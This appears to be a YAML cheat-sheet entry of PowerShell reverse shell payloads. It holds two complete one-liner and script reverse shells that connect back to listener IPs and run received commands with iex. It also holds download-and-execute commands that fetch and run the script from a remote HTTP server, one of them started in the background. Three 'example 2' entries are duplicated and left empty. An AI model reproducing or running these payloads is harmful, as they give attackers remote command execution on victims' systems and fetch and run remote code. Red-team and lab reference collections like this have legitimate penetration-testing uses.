---
functions:
  shell:
    - description: Powershell reverse shell (example 1)
      code: |
        powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.149',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    - description: Powershell reverse shell (example 2)
      code: |
    - description: Powershell reverse shell (example 2)
      code: |
    - description: Powershell reverse shell (example 2)
      code: |
    - description: Powershell reverse shell (script )
      code: |
        ps-shell.ps1:
        $ip="10.10.14.20";$port=445;$client = New-Object System.Net.Sockets.TCPClient($ip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

        From cmd.exe context:
        start /B powershell -c "iex(iwr http://10.10.14.20/ps-shell.ps1)"
        Or:
        iex(iwr http://10.10.14.20/ps-shell.ps1)
---
